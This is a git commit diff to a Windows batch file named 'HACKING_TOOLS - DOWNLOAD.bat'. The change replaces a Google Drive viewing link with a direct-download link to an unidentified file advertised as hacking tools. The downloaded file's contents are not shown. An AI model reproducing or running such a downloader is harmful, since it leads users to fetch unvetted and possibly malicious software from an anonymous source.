da316d3ff1f867de6ce6ed1eb4024e2275b5a9b4
fart-source <64970074+fart-source@users.noreply.github.com>
2020-06-05 00:30:11 -0400

    Update HACKING_TOOLS - DOWNLOAD.bat

--- HACKING_TOOLS - DOWNLOAD.bat
+++ HACKING_TOOLS - DOWNLOAD.bat
@@ -1,4 +1,4 @@
 @echo off
 color 02
-start "Microsoft Edge" https://drive.google.com/file/d/1hg6n0c8gPtaboJadAjvSKwMVbn9LSWQ3/view?usp=sharing
+start "Microsoft Edge" "https://drive.google.com/u/0/uc?export=download&confirm=fQYF&id=1hg6n0c8gPtaboJadAjvSKwMVbn9LSWQ3"
 exit
